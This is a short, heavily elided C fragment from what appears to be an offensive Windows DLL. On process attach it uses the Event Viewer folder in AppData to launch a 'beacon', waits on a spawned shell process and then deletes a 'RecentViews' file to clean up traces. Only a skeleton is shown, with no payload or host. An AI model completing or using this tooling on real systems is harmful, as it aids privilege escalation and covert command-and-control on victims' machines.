    ...
    switch (fdwReason)
    {
        ...
        case DLL_PROCESS_ATTACH:
                   ...
                   if(lpvReserved != NULL){
                    ...
                    directorySize = sizeof(directory);
                    newPathSize = sizeof(newpath);
                    ...
                    if (GetLastError() == 3) {
                        ...
                        printf("Event Viewer Folder was not found in AppData, need to run the tool twice in order to get the beacon");
                        goto cleanup;
                    }
                    ...
                    if (WaitForSingleObject(shellinfo.hProcess, INFINITE) == WAIT_OBJECT_0) {
                        if (!DeleteFileA(appdata2)) {
                            printf("DeleteFile Failed with %d. May have to delete RecentViews manually for cleanup. Its located here: %s\n", GetLastError(), appdata2);
                            goto cleanup;
                        }
